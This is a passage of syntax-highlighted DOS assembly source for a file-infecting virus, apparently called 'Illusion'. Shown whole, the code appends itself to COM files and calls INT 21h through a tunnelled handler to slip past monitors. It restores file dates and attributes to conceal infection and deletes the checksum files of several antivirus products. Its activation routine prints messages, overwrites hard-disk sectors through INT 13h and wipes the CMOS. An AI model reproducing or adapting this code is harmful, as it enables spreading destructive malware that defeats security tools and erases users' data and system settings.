           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fa00h</span><span class="sc0">                        </span><span class="sc1">;COM &gt; 64K ?</span><span class="sc0">
           </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Exit_Close</span><span class="sc0">                       </span><span class="sc1">;No sorry ...</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                 
           </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">;Set the JMP      </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                       
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                           </span><span class="sc1">;Write Virus</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Illusion_Start</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Illusion_Size</span><span class="sc0">                 </span><span class="sc1">;Virus size</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                           </span><span class="sc1">;Lseek to start</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_pointer</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                           </span><span class="sc1">;Write back the first </span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_address</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;3 bytes                 </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                                                 
           </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">                                         
</span><span class="sc5">Exit_Res</span><span class="sc4">:</span><span class="sc0">                                                                   
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Restore file time</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Restore file date</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                                              
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;AX=5701h (TBAV :-P )</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_tun21h</span><span class="sc0">

</span><span class="sc5">Exit_Close</span><span class="sc4">:</span><span class="sc0">                                                                      
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                           </span><span class="sc1">;Close file                    </span><span class="sc0">
           </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">                         

</span><span class="sc5">Res_Att</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                         </span><span class="sc1">;Restore Atributes</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Reset_Int_24h</span><span class="sc0">                    </span><span class="sc1">;Reset Int24h </span><span class="sc0">
 
</span><span class="sc5">Restore</span><span class="sc4">:</span><span class="sc0">     
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Enable_KB</span><span class="sc0">                        </span><span class="sc1">;Restore Keyboard</span><span class="sc0">
           
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;Restore this shit !</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitInt21</span><span class="sc0">                        </span><span class="sc1">;Exit ... </span><span class="sc0">


</span><span class="sc5">Old_date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;File date</span><span class="sc0">
</span><span class="sc5">Old_time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;File time</span><span class="sc0">
</span><span class="sc5">Jump_address</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                     </span><span class="sc1">;JMP Address                    </span><span class="sc0">
</span><span class="sc5">Buffer_COM</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                    </span><span class="sc1">;Original 3 bytes</span><span class="sc0">
        
        
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                       RUTINE TO MOVE POINTER                               *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Move_pointer</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;CX=0               </span><span class="sc0">
           </span><span class="sc6">cwd</span><span class="sc0">                                      </span><span class="sc1">;DX=0 </span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                      RUTINE TO CALL INT_21h TUNNELED                       *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Call_Tun21h</span><span class="sc4">:</span><span class="sc0">   
           </span><span class="sc6">pushf</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Tunnel21h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Call FAKE Int 21h   </span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                           DELETE CRC FILES                                 *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">delete_crc</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_msav</span><span class="sc0">                     </span><span class="sc1">;Chklist.ms</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">
           
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_tbav</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">

           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_smartchk</span><span class="sc0">                 </span><span class="sc1">;Smartchk.cps</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">

           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_avp</span><span class="sc0">                      </span><span class="sc1">;Avp.crc</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">

           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_ivb</span><span class="sc0">                      </span><span class="sc1">;Ivb.ntz</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">                  

           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">kill_chklist</span><span class="sc0">                  </span><span class="sc1">;Chklist.tav</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_crc_files</span><span class="sc0">

</span><span class="sc5">Exit_Delete</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">kill_crc_files</span><span class="sc4">:</span><span class="sc0"> 
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                         </span><span class="sc1">;Clear Atributes</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                           </span><span class="sc1">;Delete File</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0"> 
           </span><span class="sc6">retn</span><span class="sc0">
           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">
</span><span class="sc1">;                             SET NEW INT24h                                 *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">

</span><span class="sc5">Set_int_24h</span><span class="sc4">:</span><span class="sc0">    
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">;Point to the IVT</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                               </span><span class="sc1">;CS=ES</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;Save the original int</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldint24h</span><span class="sc0">              </span><span class="sc1">;24h address </span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">                                             
           </span><span class="sc6">movsw</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Newint24h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">               </span><span class="sc1">;Set ours !</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">
</span><span class="sc1">;                            RESTORE OLD INT24h                              *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">

</span><span class="sc5">Reset_int_24h</span><span class="sc4">:</span><span class="sc0">  
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">;Point to the IVT</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                               </span><span class="sc1">;CS=DS</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Oldint24h</span><span class="sc0">              </span><span class="sc1">;Restore the original</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;Int 24h address</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">
           </span><span class="sc6">movsw</span><span class="sc0">

           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">
</span><span class="sc1">;                             NEW INT 24h                                    *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************   </span><span class="sc0">

</span><span class="sc5">Newint24h</span><span class="sc4">:</span><span class="sc0">     
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">;Pass the error code</span><span class="sc0">
           </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Oldint24h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;Original int 24h</span><span class="sc0">
                 

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                       DATA ABOUT ANTI-ANTIVIRUS                            *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc1">; CRC files to delete!  </span><span class="sc0">

</span><span class="sc5">kill_tbav</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kill_msav</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKLIST.MS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kill_smartchk</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SMARTCHK.CPS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kill_avp</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP.CRC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kill_ivb</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IVB.NTZ'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kill_chklist</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKLIST.TAV'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">



</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                        !! ACTIVATION ROUTINE !!                            *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">PAYLOAD</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                         </span><span class="sc1">;Clear Screen        </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                    
          
</span><span class="sc5">PREP_VIDEO</span><span class="sc4">:</span><span class="sc0">    
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                           </span><span class="sc1">;Set values              </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                             </span><span class="sc1">;Line</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0">                            </span><span class="sc1">;Position</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MENSAJE</span><span class="sc4">]</span><span class="sc0">  
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                              </span><span class="sc1">;Print messagge               </span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MENSAJE2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Messagge  </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                              </span><span class="sc1">;Print messagge               </span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MENSAJE3</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Messagge  </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                              </span><span class="sc1">;Print messagge               </span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MENSAJE4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Messagge  </span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                              </span><span class="sc1">;Print messagge               </span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         DESTROY THE HARDDISK                               *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Rip_hd</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">;Clear dx</span><span class="sc0">
</span><span class="sc5">Rip_hd1</span><span class="sc4">:</span><span class="sc0">                             
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;Track 0, sector 1</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0311h</span><span class="sc0">                            </span><span class="sc1">;17 secs per track </span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5000h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                              </span><span class="sc1">;Kill 17 sectors</span><span class="sc0">
           </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">rip_hd2</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                              </span><span class="sc1">;Reset disks if needed</span><span class="sc0">
</span><span class="sc5">Rip_hd2</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">                               </span><span class="sc1">;Increment head number</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;If head number is below 4</span><span class="sc0">
           </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">rip_hd1</span><span class="sc0">                          </span><span class="sc1">;then go kill another 17 </span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">                               </span><span class="sc1">;sectors increase track </span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc0">                           </span><span class="sc1">;number ...  99 tracks ?</span><span class="sc0">
           </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">rip_hd</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         NOW DESTROY THE CMOS                               *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">kill_cmos1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">

</span><span class="sc5">kill_cmos2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       
           </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;CMOS !!</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;Overwrite CMOS with 0 !!         </span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">kill_cmos2</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">      


